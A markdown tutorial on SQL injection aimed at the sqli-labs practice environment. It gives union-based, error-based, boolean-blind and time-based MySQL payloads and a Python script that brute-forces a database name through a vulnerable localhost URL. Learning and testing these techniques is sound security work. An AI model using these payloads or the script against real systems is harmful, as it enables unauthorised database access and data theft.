# SQL Injections

First Find the injection : ) , ' , " , ) , ') , “)

INJECTION TYPES
- Error based
- Blind
	- Partial blind [Boolean]
	- Full blind [Time based]
## Handy-Functions:

| Function                                          	| Description                                                          	|
|---------------------------------------------------	|----------------------------------------------------------------------	|
| version()/@@version/@global.version               	| Gives the os info                                                    	|
| ser()/current_user(),system_user(),session_user() 	| Gives the info about the user of the database (E.g : root@localhost) 	|
| database()/schema()                               	| Gives the database name                                              	|
| @@hostname                                        	| Gives the host name                                                  	|
| UUID()                                            	| Gives the MAC address                                                	|
| Group_concat()                                    	| concatenate the items the the given field                            	|
| substr(“abc",1,1)                                 	| a                                                                    	|
| mid(“abc",1,1)                                    	| a                                                                    	|
| ascii('A’)                                        	| 65                                                                   	|
| char(65)                                          	| A                                                                    	|
| concat('a’,’b’)                                   	| ab                                                                   	|
| concat_ws('-’,’a’,’b’,’c’)                        	| a-b-c                                                                	|
| benchmark(no.of loops,expression)                 	| eg. select benchmark(10000000000,1+1)                                	|
| char(97,98,99)                                    	| abc                                                                  	|
| @@basedir                                         	| installation patch                                                   	|
| @@version_compile_os                              	| OS                                                                   	|
| @@innodb_version                                  	| mysql version                                                        	|
| greatest('a','b')='b'                             	| 1                                                                    	|
| greatest(1,2) between 1 and 3                     	| 1                                                                    	|
| like                                                  |   =       
## Lab 

Clone the repo and set up the lab in your system link: https://github.com/Audi-1/sqli-labs

This is the best place to practice SQL injections.

### Finding the injection :
Try the following basic injection 

    ' , " , ) ,  , ") , ’) or 1 -- - [eg : ' or 1 --]

    ' , " , ) ,  , ") , ’) || ',",(, ,(",(’ 1 [eg : ' or '1 ]

Once the injection is found

Find the number of columns in the statement

Find the database name, table names, column names by the below-mentioned methods

Finding the No.of columns in the statement :

1. Start by injecting order by [or group by] 1,2,3...N once you get the error “unknown column" stop there,  then the no.of columns are N-1

2.Using the columns that are displayed as a result of query we can dump the database
    
3. Consider the no.of columns are 3,  and the columns that are being displayed are 2, using those 2 columns we have to dump the database 

Finding the database name:

	' union select 1,database(),2 -- -

![sql](img/wiki/sql/sqld.png)

Finding the tables in the database :

    ' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 -- -

![sql](img/wiki/sql/sqlt.png)

Finding the columns in the database :

    ' union select 1,(select group_concat(column_name) from information_schema.columns where table_name="        "),2 -- -        
[in the blank space give the table name]

![sql](img/wiki/sql/sqlc.png)

Now dumping the information from the columns :
    
    ' union select 1,(select column_name from table_name),3 -- -

[ the columns_name and the table_name are the names obtained from the above injections]

-- all the above injections are based on the assumption the injection is using [ ' ] and the no.of columns are 3, out of which the result of the middle column is being displayed in the web-page

ERROR-BASED:

In this case, you can’t directly dump the database on the screen but you have to dump the data using the errors that we will force to pop-up

Basic-query :
    
    SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)

Here instead of username from users,Start from the base like knowing the database name,tables in the database,columns in each table etc. viz database(),table_name from information_schema.tables where table_schema=database() etc.

## Blind Injections

### Boolean based:

As the name says we will dump the database based on the boolean injection output

Finding the error is same : ' or 1 ; “ or 1 ……

Now we will inject our query at the place of one as follows :

    ' or (select database()="security") -- -

If the database name is security the query in the parentheses will return 1 and the whole query value become true hence we will get the output

Let’s dump the database :

Our first aim to find the length of the database name :

    ' or (length(database())=5) -- -

If the length of the name if the database it will return true value.
On knowing the length of the database name lets brute force the database name ,Here Regex comes to play I will suggest to go through some basic syntax of regex.

    ' or (substr(database(),1,1)="a%")

This query will return true if the name of the database starts with a .So brute force  from a - z.I will recommend to bruteforce with an automation script.For that you will need to know about the libraries : ***requests*** and ***time*** in python.

Documentation link for requests : http://docs.python-requests.org/en/master/user/quickstart/

Documentation linke for Time : https://docs.python.org/2/library/time.html

A python programme for brute forcing the database name:

```python
import requests

url1 = "http://localhost/sqli-labs-master/Less-8/?id=1' and (substr(database(),"
url2 = "http://localhost/sqli-labs-master/Less-8/?id=1' and (length(database())="
pay="abcdefghijklmnopqrstuvwxyz,1234567890-_.@!{}=-)(*&^%$#"
database=""

for i in range(1,20):
    query = url2 + str(i) + ") -- -"
    http = requests.get(query)
    content = http.text
    if "You are in..........." in content:
        length = i

for i in range(1,length+1):
    for j in pay:
        query=url1 + str(i) + ",1" + ")='" + j+"') -- -"
        http = requests.get(query)
        content=http.text
        if "You are in..........." in content:
            database=database+j

print("The database name : " + database)
```


You can make it your own way which you may think is the best and has less time complexity.

So Now that you know how to bruteforce the database name you can get the whole database by modifying the queries with the previous knowledge you got from the error based injections.

### Time based :
This not so different from the boolean based injections.The only thing here is you are going to use an if-condition .

Let’s try to do it in backend : 

Try 

    select sleep(10);

![](img/wiki/sql/sql1.png)
    
You will get the response only after 10 sec

    Select if(database()="security",sleep(5),null)

if the name of the database() is security you will get the response only after 5 sec.

Now let’s try to inject it :
    
    1' and if((select substr((select database()),1,1)="s",sleep(5),null) -- -
The databse responded after 5 sec. By using above mentioned functions and the general notion you got from the boolean based injections try to make a python script and dump the database.

